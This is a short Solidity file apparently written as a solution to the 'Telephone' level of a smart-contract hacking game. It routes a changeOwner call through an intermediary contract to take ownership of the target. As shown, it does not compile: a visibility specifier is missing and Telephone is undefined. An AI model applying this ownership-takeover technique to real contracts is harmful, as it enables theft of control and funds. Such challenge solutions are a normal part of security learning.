// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Attacker{
    Telephone telephone;

    constructor(address _level){
        telephone = Telephone(_level);
    }

    function attack(address owner){
        telephone.changeOwner(owner);
    }
    
}